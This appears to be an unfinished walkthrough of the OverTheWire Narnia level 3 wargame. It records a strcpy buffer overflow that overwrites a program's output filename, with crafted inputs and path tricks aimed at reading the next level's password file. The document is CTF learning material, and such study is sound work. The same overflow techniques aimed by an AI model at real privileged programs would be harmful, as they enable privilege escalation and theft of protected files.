---
title: narnia 3 walkthrough
description: over the wire narnia 3
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: narnia-3 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: narnia 3 walkthrough
    order: 30
---
## Description
connect
```bash
$ ssh narnia3@narnia.labs.overthewire.org -p 2226
8SyQ2wyEDU
```
execute
```bash
$ /narnia/narnia3
usage, /narnia/narnia3 file, will send contents of file 2 /dev/null
$ /narnia/narnia3 /etc/narnia_pass/narnia4
copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)
```

---
## Hint
- https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
- https://0x10f8.wordpress.com/2019/05/21/subverting-nx-bit-with-return-to-libc/
- https://blog.devaviary.com/posts/narnia-guide/levels-0-to-4.html

---

## Progress
```bash
$ checksec --file /narnia/narnia3
[*] '/narnia/narnia3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Tried to use [[buffer overflow]]. Use pattern create in gef
```bash
$ ltrace /narnia/narnia3 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
strcpy(0xffffd100, "aaaabaaacaaadaaaeaaafaaagaaahaaa"...)          = 0xffffd100
open("iaaajaaakaaalaaamaaanaaaoaaapaaa"..., 2, 00)                 = -1
```
The value of `ofile` was changed from  `/dev/null` to part of payload.
In addition, the `ofile` started from the 33rd character.

### Strategy 1
The remaining steps might be
1. Let `ofile` keeps its own value
2. Construct a shellcode and properly put it into the payload
3. Overwrite the return address to execute the shellcode.
#### Step 1
Failed
```
$ ltrace /narnia/narnia3 `{ printf "A%0.s" {1..32}; printf "/dev/null/"; printf "\0%0.s" {1..7}; printf "A"; }`
-bash: warning: command substitution: ignored null byte in input
__libc_start_main(0x80491d6, 2, 0xffffd5c4, 0 <unfinished ...>
strcpy(0xffffd4d0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)          = 0xffffd4d0
open("/dev/null/A", 2, 00)                                         = -1
```
### Strategy 2 (Failed)
1. construct an input file with a special name and path
2. use buffer overflow to overwrite ofile as /etc/narnia_pass/narnia4
3. ssh to narnia4
#### Step 1
```bash
narnia3@gibson:/tmp/tmp.xx2QlC2PYn$ echo aaaabaaacaaadaaaeaaafaaagaaahaaa | wc
      1       1      33
narnia3@gibson:/tmp/tmp.xx2QlC2PYn$ echo /tmp/tmp.xx2QlC2PYn | wc
      1       1      20
```
33-20 = 13. 
Therefore, we need to construct a folder with length of 12 characters.
```bash
narnia3@gibson:/tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass$ echo 1234 > narnia4
narnia3@gibson:/tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass$ /narnia/narnia3 /tmp/tmp.xx2QlC2PYn/aaaaaaaaaaaa/etc/narnia_pass/narnia4 
error opening /etc/narnia_pass/nar????
```
#### Step 1.5
```
/etc/narnia_pass$ ls -l narnia4 
-r-------- 1 narnia4 narnia4 11 Oct  5 06:20 narnia4
```
It is read-only. This strategy failed.
### Strategy 3
Similar to strategy 2
1. make `argv[1]` to `/etc/narnia_pass/narnia4`
2. use buffer overflow to overwrite the output file name
#### Step 1
A long prefix should be added to `/etc/narnia_pass/narnia4`. Use relative path!
With a little script, input can be determined.
```
i=2
././../../etc/narnia_pass/narnia4
4
i=3
./././../../etc/narnia_pass/narnia4
ia4
i=4
././././../../etc/narnia_pass/narnia4
rnia4
```
#### Step 2
```
/tmp/tmp.6NeI6Ehb05$ /narnia/narnia3 ./././../../etc/narnia_pass/narnia4
error opening ia4
```


---

## Solving

### Techniques
- 

### Tools
- 